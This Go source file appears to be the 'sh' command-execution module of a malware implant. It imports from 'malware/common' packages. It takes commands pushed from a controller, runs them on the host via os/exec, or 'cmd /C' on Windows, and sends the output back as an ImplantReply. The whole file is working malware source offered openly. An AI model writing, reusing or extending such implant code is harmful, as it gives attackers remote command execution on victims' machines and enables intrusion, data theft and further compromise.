// +build !windows
package sh

import (
	"fmt"
	"malware/common/messages"
	"malware/common/types"
	"os/exec"
	"runtime"
	"strings"
)

type state struct {
	running bool
}

type settings struct {
	state *state // Tell our loop to stop
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false}
	return settings{&state}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
	cmd := message.GetExec()
	if cmd == nil {
		return false
	}

	var out []byte
	var err error

	if runtime.GOOS == "windows" {
		args := strings.Join(cmd.Args, " ")
		out, err = exec.Command("cmd", "/C", cmd.Exec+" "+args).Output()
	} else {
		out, err = exec.Command(cmd.Exec, cmd.Args...).Output()
	}
	fmt.Println(err)
	if err != nil {
		callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte(err.Error())})
	} else {
		callback(&messages.ImplantReply{Module: settings.ID(), Args: out})
	}
	return true
}

// Init the state of this module
func (settings settings) Init() {
	settings.state.running = true
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "sh" }
